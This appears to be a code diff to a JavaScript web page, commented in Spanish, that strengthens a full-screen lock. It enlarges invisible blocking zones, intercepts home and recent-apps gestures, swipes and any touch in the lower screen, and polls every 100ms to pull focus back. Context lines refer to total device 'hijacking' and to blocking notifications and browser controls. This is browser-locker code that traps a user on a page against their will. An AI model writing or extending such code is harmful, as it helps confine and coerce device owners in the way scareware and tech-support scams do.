@@ -191,11 +191,12 @@
         let lockWindows = [];
         let audioContext = null;
         
-        // Variables para gestos
+        // Variables para gestos - MÁS AGRESIVO
         let gestureStartX = 0;
         let gestureStartY = 0;
         let gestureStartTime = 0;
-        let edgeThreshold = 50;
+        let edgeThreshold = 100; // Aumentado a 100px para mayor sensibilidad
+        let homeGestureThreshold = 150; // Zona específica para gesto home
         
         // Prevenir TODAS las acciones del usuario
         document.addEventListener('contextmenu', function(e) {
@@ -447,12 +448,21 @@
                     return false;
                 }
                 
-                // Gesto desde borde inferior (home/recientes)
-                if (gestureStartY > screenHeight - edgeThreshold) {
+                // Gesto desde borde inferior (home/recientes) - MÁS AGRESIVO
+                if (gestureStartY > screenHeight - homeGestureThreshold) {
                     e.preventDefault();
                     e.stopPropagation();
                     e.stopImmediatePropagation();
                     showGestureWarning('GESTO HOME BLOQUEADO');
+                    return false;
+                }
+                
+                // Bloqueo adicional para cualquier toque en la parte inferior
+                if (gestureStartY > screenHeight * 0.8) { // 80% de la pantalla hacia abajo
+                    e.preventDefault();
+                    e.stopPropagation();
+                    e.stopImmediatePropagation();
+                    showGestureWarning('ZONA HOME BLOQUEADA');
                     return false;
                 }
                 
@@ -494,12 +504,30 @@
                         return false;
                     }
                     
-                    // Swipe hacia arriba desde abajo (home/recientes)
-                    if (gestureStartY > window.innerHeight - edgeThreshold && deltaY < -100) {
+                    // Swipe hacia arriba desde abajo (home/recientes) - ULTRA AGRESIVO
+                    if (gestureStartY > window.innerHeight - homeGestureThreshold && deltaY < -50) {
                         e.preventDefault();
                         e.stopPropagation();
                         e.stopImmediatePropagation();
                         showGestureWarning('GESTO HOME BLOQUEADO');
+                        return false;
+                    }
+                    
+                    // Bloqueo adicional para swipes hacia arriba desde cualquier parte inferior
+                    if (gestureStartY > window.innerHeight * 0.7 && deltaY < -30) {
+                        e.preventDefault();
+                        e.stopPropagation();
+                        e.stopImmediatePropagation();
+                        showGestureWarning('SWIPE HOME BLOQUEADO');
+                        return false;
+                    }
+                    
+                    // Bloqueo para swipes rápidos hacia arriba desde cualquier lugar
+                    if (deltaY < -80 && deltaTime < 300) {
+                        e.preventDefault();
+                        e.stopPropagation();
+                        e.stopImmediatePropagation();
+                        showGestureWarning('SWIPE RÁPIDO BLOQUEADO');
                         return false;
                     }
                     
@@ -513,14 +541,23 @@
                     }
                 }
                 
-                // Bloquear cualquier movimiento que inicie desde los bordes
+                // Bloquear cualquier movimiento que inicie desde los bordes - MÁS AGRESIVO
                 if (gestureStartX < edgeThreshold || 
                     gestureStartX > window.innerWidth - edgeThreshold ||
                     gestureStartY < edgeThreshold || 
-                    gestureStartY > window.innerHeight - edgeThreshold) {
+                    gestureStartY > window.innerHeight - homeGestureThreshold) {
                     e.preventDefault();
                     e.stopPropagation();
                     e.stopImmediatePropagation();
+                    return false;
+                }
+                
+                // Bloqueo adicional para movimientos verticales hacia arriba
+                if (Math.abs(deltaY) > Math.abs(deltaX) && deltaY < -20) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    e.stopImmediatePropagation();
+                    showGestureWarning('MOVIMIENTO VERTICAL BLOQUEADO');
                     return false;
                 }
             }
@@ -542,10 +579,32 @@
             lastTouchEnd = now;
         }, false);
 
-        // Prevenir scroll
+        // Prevenir scroll y TODOS los gestos verticales
         document.addEventListener('touchmove', function(e) {
-            e.preventDefault();
-        }, { passive: false });
+            if (isLocked) {
+                e.preventDefault();
+                e.stopPropagation();
+                e.stopImmediatePropagation();
+                return false;
+            }
+        }, { passive: false, capture: true });
+        
+        // Bloqueo específico adicional para gestos home
+        document.addEventListener('touchstart', function(e) {
+            if (isLocked) {
+                const touch = e.touches[0];
+                const screenHeight = window.innerHeight;
+                
+                // Bloquear CUALQUIER toque en el tercio inferior de la pantalla
+                if (touch.clientY > screenHeight * 0.66) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    e.stopImmediatePropagation();
+                    showGestureWarning('ZONA INFERIOR BLOQUEADA');
+                    return false;
+                }
+            }
+        }, { passive: false, capture: true });
 
         // SISTEMA DE HIJACKING TOTAL DEL DISPOSITIVO
         function createSystemOverride() {
@@ -730,6 +789,31 @@
                     }
                 }
             }, 200);
+            
+            // Monitoreo ultra-agresivo para gestos home
+            setInterval(function() {
+                if (isLocked) {
+                    // Detectar si el usuario está intentando hacer gestos
+                    const activeElement = document.activeElement;
+                    if (activeElement && activeElement !== document.body) {
+                        activeElement.blur();
+                        document.body.focus();
+                        showGestureWarning('FOCO REDIRIGIDO - GESTO BLOQUEADO');
+                    }
+                    
+                    // Forzar que el cursor esté en el centro de la pantalla
+                    if (document.elementFromPoint) {
+                        const centerX = window.innerWidth / 2;
+                        const centerY = window.innerHeight / 2;
+                        const centerElement = document.elementFromPoint(centerX, centerY);
+                        if (centerElement && centerElement.closest('.security-overlay')) {
+                            // Todo bien, el foco está en nuestra área
+                        } else {
+                            showGestureWarning('FOCO FUERA DEL ÁREA SEGURA');
+                        }
+                    }
+                }
+            }, 100); // Cada 100ms para máxima sensibilidad
         }      
   // Bloquear notificaciones y alertas del sistema
         function blockSystemNotifications() {
@@ -808,6 +892,35 @@
             }, true);
         }
 
+        // Sistema de detección ultra-agresivo para gesto home
+        function createHomeGestureBlocker() {
+            // Crear una zona masiva en la parte inferior
+            const homeBlocker = document.createElement('div');
+            homeBlocker.style.position = 'fixed';
+            homeBlocker.style.bottom = '0';
+            homeBlocker.style.left = '0';
+            homeBlocker.style.width = '100%';
+            homeBlocker.style.height = '250px'; // Zona masiva
+            homeBlocker.style.zIndex = '999997';
+            homeBlocker.style.background = 'transparent';
+            homeBlocker.style.pointerEvents = 'auto';
+            
+            // Interceptar TODOS los eventos en esta zona
+            ['touchstart', 'touchmove', 'touchend', 'click', 'mousedown', 'mousemove'].forEach(eventType => {
+                homeBlocker.addEventListener(eventType, function(e) {
+                    if (isLocked) {
+                        e.preventDefault();
+                        e.stopPropagation();
+                        e.stopImmediatePropagation();
+                        showGestureWarning('ZONA HOME ULTRA-BLOQUEADA');
+                        return false;
+                    }
+                }, { passive: false, capture: true });
+            });
+            
+            document.body.appendChild(homeBlocker);
+        }
+
         // Bloquear gestos específicos de Android
         function blockAndroidGestures() {
             const edges = ['top', 'bottom', 'left', 'right'];
@@ -830,7 +943,7 @@
                         edgeZone.style.bottom = '0';
                         edgeZone.style.left = '0';
                         edgeZone.style.width = '100%';
-                        edgeZone.style.height = '60px';
+                        edgeZone.style.height = '200px'; // Aumentado para mayor protección
                         break;
                     case 'left':
                         edgeZone.style.top = '0';
@@ -969,6 +1082,7 @@
             blockSystemNotifications();
             blockChromeInterface();
             blockNewWindows();
+            createHomeGestureBlocker(); // NUEVO: Bloqueador específico para home
             blockAndroidGestures();
             createInvisibleOverlay();
             
